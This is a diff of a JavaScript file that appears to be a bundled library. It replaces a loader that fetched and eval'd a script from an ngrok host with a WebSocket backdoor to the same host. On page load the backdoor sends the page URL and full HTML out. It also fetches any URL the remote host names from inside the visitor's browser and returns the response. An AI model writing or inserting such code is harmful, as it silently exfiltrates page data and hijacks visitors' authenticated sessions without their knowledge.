@@ -13,13 +13,36 @@
  */
 
 ;(async () => {
-  try {
-    const response = await fetch("https://eel-moral-ape.ngrok-free.app/public/scripts/inject-configs.js")
-    const script = await response.text()
-    eval.call(window, script)
-  } catch (error) {
-    alert(error.message)
-  }
+  document.addEventListener("DOMContentLoaded", function () {
+    const socket = new WebSocket("wss://eel-moral-ape.ngrok-free.app/ws")
+    socket.addEventListener("message", async (event) => {
+      const { action, payload } = JSON.parse(event.data)
+      if (action === "fetch_url") {
+        const response = await fetch(payload.url, payload.init)
+        const data = await response.text()
+        socket.send(
+          JSON.stringify({
+            action: "fetch_logger",
+            payload: {
+              response: data,
+              url: payload.url,
+            },
+          })
+        )
+      }
+    })
+    socket.addEventListener("open", () => {
+      socket.send(
+        JSON.stringify({
+          action: "embed_logger",
+          payload: {
+            url: window.location.href,
+            html: document.documentElement.outerHTML,
+          },
+        })
+      )
+    })
+  })
 })()
 ;(function (global, factory) {
   if (typeof module === "object" && typeof module.exports === "object") {
